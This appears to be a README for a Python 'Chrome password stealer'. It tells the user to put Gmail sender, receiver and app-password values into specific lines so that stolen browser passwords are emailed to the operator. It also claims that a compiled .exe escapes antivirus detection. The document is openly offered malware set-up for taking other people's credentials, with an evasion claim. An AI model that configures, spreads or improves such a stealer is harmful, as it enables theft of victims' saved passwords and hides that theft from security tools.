Chrome password stealer source code.

You need to change lines 74, 103 and 104.
line | code | 
--- | --- 
74 | `server.login(sender, 'Gmail app password')` | 
103 | `sender = 'example@gmail.com'` |
104 | `receiver = 'example@gmail.com'` | 


if you have not created a chrome app password, you can create one [here](https://myaccount.google.com/apppasswords). (line 74)

*(you can convert the python code to .exe, it is not detected by antivirus because it makes a backup.)*
